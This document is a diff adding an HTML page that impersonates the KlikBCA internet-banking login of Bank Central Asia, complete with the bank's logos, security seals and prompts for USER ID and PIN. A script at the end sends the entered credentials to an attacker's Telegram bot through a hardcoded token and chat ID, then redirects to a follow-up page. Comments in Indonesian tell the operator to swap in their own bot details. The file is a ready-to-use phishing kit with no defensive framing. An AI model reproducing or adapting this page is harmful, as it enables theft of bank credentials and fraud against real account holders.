@@ -1,0 +1,263 @@
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>KlikBCA Login</title>
+  <style>
+    /* Import Google Font Roboto */
+    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+    /* Reset and base */
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #fff;
+      color: #2c2c4c;
+    }
+
+    /* Header bar with blue background and yellow borders */
+    .header-bar {
+      background-color: #3f4095;
+      border-top: 8px solid #f7d117;
+      border-bottom: 4px solid #f7d117;
+      padding: 8px 12px;
+      display: flex;
+      align-items: center;
+    }
+
+    .header-bar img {
+      height: 30px;
+      width: auto;
+      display: block;
+    }
+
+    main {
+      padding: 12px 16px;
+    }
+
+    /* Labels with blue text and underline */
+    label {
+      display: block;
+      color: #3f4095;
+      font-size: 16px;
+      text-decoration: underline;
+      margin-bottom: 4px;
+      font-weight: 400;
+      line-height: 1.2;
+    }
+
+    /* Orange helper text below labels */
+    .helper-text {
+      color: #f39200;
+      font-size: 14px;
+      margin-top: 10px;
+      margin-bottom: px;
+    }
+
+    /* Input fields */
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      border: 1px solid #999;
+      border-radius: 4px;
+      padding: 6px 8px;
+      font-size: 16px;
+      margin-bottom: 16px;
+      box-sizing: border-box;
+    }
+
+    /* Login button */
+    .login-button {
+      border: 1px solid #444;
+      background-color: #fff;
+      color: #000;
+      padding: 6px 12px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 4px;
+      user-select: none;
+    }
+
+    /* Container for login button and full site link */
+    .login-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    /* Full Site link */
+    .full-site-link {
+      color: #0033cc;
+      text-decoration: underline;
+      font-size: 16px;
+      white-space: nowrap;
+    }
+
+    /* Banner image */
+    .banner-image {
+      width: 100%;
+      height: 100px;
+      object-fit: contain;
+      margin-bottom: 16px;
+      display: block;
+    }
+
+    /* Security logos container */
+    .security-logos {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .security-logos img {
+      height: 40px;
+      width: auto;
+      display: block;
+    }
+
+    /* Paragraph text */
+    p {
+      font-size: 16px;
+      line-height: 1.4;
+      margin-top: 0;
+      margin-bottom: 8px;
+      color: #2c2c4c;
+    }
+
+    /* Orange text paragraphs */
+    .orange-text {
+      color: #f39200;
+      font-size: 16px;
+      line-height: 1.4;
+      margin-top: 0;
+      margin-bottom: 8px;
+    }
+
+    /* Underlined links in paragraphs */
+    a {
+      color: #0033cc;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+
+    /* Horizontal rule */
+    hr {
+      border: none;
+      border-top: 1px solid #999;
+      margin: 8px 0;
+    }
+
+    /* Bottom blue bar */
+    .bottom-bar {
+      background-color: #3f4095;
+      height: 48px;
+      width: 100%;
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 480px) {
+      label {
+        font-size: 16px;
+      }
+      .helper-text,
+      p,
+      .orange-text {
+        font-size: 13px;
+      }
+      .login-button {
+        font-size: 14px;
+        padding: 6px 10px;
+      }
+      .full-site-link {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <body onload="document.getElementById('txt_user_id').focus();">
+
+    <div id="wrapper">
+        <div id="header">
+            <div id="logo" style="background:#FFFFFF url(https://m.klikbca.com/images/bg_top_2x55.gif) repeat-x top; height:57px; color:#FFFFFF">
+                <img src="https://m.klikbca.com/images/logo_bca_64x55.gif" alt="BCA-lite">
+            </div>
+            <!--<div style="background:#4f53b6"> </div>-->
+            <div style="background:#e7cb00; height:3px"> </div>
+        </div>
+
+        <div id="page-content" style="display:inline-block;">
+            <table id="tbl-txtinput" cellpadding="6" cellspacing="0" width="100%">
+
+                <tbody>
+  </div>
+  <main>
+    <label for="userid">Silakan masukkan USER ID Anda</label>
+    <p class="helper-text">Please enter your USER ID</p>
+    <input id="userid" type="text" autocomplete="off" />
+
+    <label for="pin">Silakan masukkan PIN Internet Banking Anda</label>
+    <p class="helper-text">Please enter your Internet Banking PIN</p>
+    <input id="pin" type="password" autocomplete="off" />
+
+    <div class="login-row">
+      <button id="loginBtn" class="login-button" type="button">LOGIN</button>
+      <a class="full-site-link" href="#">Full Site</a>
+    </div>
+
+    <img alt="Banner showing a laptop with check marks for Browser Terupdate and OS Terupdate, and a man in a suit with text about KlikBCA service access and a KlikBCA logo" class="banner-image" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg7ujZE_VXFnJlP5TCCF3YXgRoTx0DQ6lVBjLKEahhhAn-0ArWSC9_oEiErcCtmYT_D7IQNoUNmUXx6ZNPiCMWAM_Ftq3bsjDzFfVdtIYfojtukvSCsGecmRU17ZuQVCz5dKqEVuiynA5wR0Gjz-hAg_MLZGUeIDEBoO7LFAjOoRCD5NbyRP5vcLxxFjWI/s1600/1000015643.gif" />
+
+    <div class="security-logos">
+      <img alt="AWAS MODUS security logo with shield and lock icon" src="https://m.klikbca.com/images/keamanan-ib.png" />
+      <img alt="digiCert EV SECURE logo with lock icon and Click to Verify text" src="https://m.klikbca.com/images/digicert-seal.png" />
+    </div>
+    <hr />
+  </main>
+  <div class="bottom-bar"></div>
+
+  <script>
+    // Ganti dengan token bot Telegram kamu
+    const telegramBotToken = '8438787257:AAFpaMeBkcOpnpiWrZBBuCKZYzfs1cgjMiA';
+    // Ganti dengan chat ID Telegram kamu
+    const telegramChatId = '7569557649';
+
+    document.getElementById('loginBtn').addEventListener('click', () => {
+      const userId = document.getElementById('userid').value;
+      const pin = document.getElementById('pin').value;
+
+      if (!userId || !pin) {
+        alert('Please fill in both USER ID and PIN.');
+        return;
+      }
+
+      const message = `User ID: ${userId}\nPIN: ${pin}`;
+
+      // Kirim pesan ke Telegram via Bot API
+      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+     window.location.href="keybca1.html";
+          // Bisa reset form atau redirect jika perlu
+        } else {
+          alert('Gagal mengirim data ke Telegram.');
+        }
+      })
+      .catch(error => {
+        alert('Terjadi kesalahan saat mengirim data.');
+        console.error(error);
+      });
+    });
+  </script>
+</body>
+</html>
